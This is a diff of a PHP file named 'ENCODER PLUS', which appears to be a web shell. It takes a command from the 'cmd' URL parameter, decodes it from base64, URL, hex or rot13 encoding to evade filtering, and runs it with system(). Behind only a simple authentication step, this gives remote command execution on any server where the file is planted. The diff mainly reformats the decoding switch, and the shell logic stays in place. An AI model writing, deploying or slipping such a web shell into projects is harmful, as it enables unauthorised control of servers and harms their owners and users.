@@ -1,6 +1,6 @@
 <?php
 // ================================================================
-// ENCODER PLUS - Multi-Encoding (FIXED)
+// ENCODER PLUS – Multi-Encoding Support (FIXED)
 // ================================================================
 
 // Auth sederhana
@@ -19,11 +19,23 @@ if (isset($_GET['cmd'])) {
     }
     
     switch($type) {
-        case 'base64': $cmd = base64_decode($cmd, true); if ($cmd === false) die('Invalid base64'); break;
-        case 'url': $cmd = urldecode($cmd); break;
-        case 'hex': $cmd = hex2bin($cmd); if ($cmd === false) die('Invalid hex'); break;
-        case 'rot13': $cmd = str_rot13($cmd); break;
-        case 'none': default: break;
+        case 'base64': 
+            $cmd = base64_decode($cmd, true); 
+            if ($cmd === false) die('Invalid base64'); 
+            break;
+        case 'url': 
+            $cmd = urldecode($cmd); 
+            break;
+        case 'hex': 
+            $cmd = hex2bin($cmd); 
+            if ($cmd === false) die('Invalid hex'); 
+            break;
+        case 'rot13': 
+            $cmd = str_rot13($cmd); 
+            break;
+        case 'none': 
+        default: 
+            break;
     }
     
     system($cmd);
